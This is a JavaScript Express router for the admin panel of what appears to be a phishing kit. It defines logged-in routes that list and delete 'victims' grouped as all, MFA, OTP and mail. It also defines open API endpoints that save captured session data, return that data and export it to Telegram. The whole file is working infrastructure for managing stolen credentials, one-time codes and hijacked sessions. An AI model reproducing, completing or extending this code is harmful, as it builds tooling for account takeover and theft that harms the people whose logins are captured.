const express = require("express");
const router = express.Router();

const adminController = require("../controller/admin-controller");

const isAdminLoggedIn = require("../middleware/admin-auth");

/* GET home page. */

router.get("/", adminController.getAdminIndex);

router.get("/login", adminController.getAdminLogin);

router.post("/login-account", adminController.postAdminLogin);

// Account creation
router.get("/register", adminController.getAdminRegister);

router.post("/create-account", adminController.postAdminRegister);

// Logout

router.post("/logout", adminController.postAdminLogout);

// ---------------------------

router.get("/dashboard", isAdminLoggedIn, adminController.getAdminDashboard);

router.get("/victims/all", isAdminLoggedIn, adminController.getAllVictims);

router.get("/victims/mfa", isAdminLoggedIn, adminController.getMFAVictims);

router.get("/victims/otp", isAdminLoggedIn, adminController.getOTPVictims);

router.get("/victims/mail", isAdminLoggedIn, adminController.getMailVictims);

// sub paths

router.get("/dashboard/victim/:id", isAdminLoggedIn, adminController.getVictim);

router.post(
  "/dashboard/victim/delete/:id",
  isAdminLoggedIn,
  adminController.postDeleteSession
);

router.get("/victims/:id", isAdminLoggedIn, adminController.getLog);

router.post(
  "/victims/delete/:id",
  isAdminLoggedIn,
  adminController.postDeleteLog
);

// APIs

router.get("/api/session-data", adminController.getSessionDataAPI);

router.post("/api/getUrl", adminController.postUrlData);

router.post("/api/saveSession", adminController.postSaveLogs);

router.post("/api/exportTelegram", adminController.postExportTg);

module.exports = router;
